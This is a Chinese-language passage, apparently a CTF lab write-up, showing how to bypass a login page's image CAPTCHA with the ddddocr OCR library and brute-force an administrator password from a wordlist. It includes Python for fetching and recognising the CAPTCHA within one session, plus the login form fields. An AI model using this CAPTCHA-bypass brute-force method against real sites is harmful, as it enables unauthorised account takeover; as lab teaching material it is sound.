
## 漏洞点

登录页有数字图片验证码。

但是这个验证码可以直接用 `ddddocr` 识别，识别率很高。

只要注意一点：

> 获取验证码图片和提交登录表单必须使用同一个 session。

因为验证码通常和 `PHPSESSID` 绑定，如果换 session，验证码就对不上。

### 3. 先测试识别验证码

新建一个简单测试：

```python
import random
import requests
import ddddocr

ocr = ddddocr.DdddOcr(show_ad=False, beta=True)
session = requests.Session()

img = session.get(
    "http://47.120.76.57:33856/yanzhengma.php",
    params={"nocache": str(random.random())}
)

code = ocr.classification(img.content)
print(code)
```

能输出 4 位数字就说明可以自动识别。

### 4. 观察登录请求

登录请求接口是：

```text
/login.php
```

提交字段是：

```text
name
pwd
yzm
```

所以爆破时提交：

```python
data = {
    "name": "administrator",
    "pwd": password,
    "yzm": code,
}
```

### 5. 爆破密码

题目目录里有密码字典：

```text
password2.txt
```

每次尝试流程：

1. 用同一个 `session` 请求验证码图片。
2. 用 `ddddocr` 识别验证码。
3. 用同一个 `session` 提交用户名、密码、验证码。
4. 如果页面返回 flag，说明成功。
5. 如果验证码错误，就重新拉验证码再试当前密码。
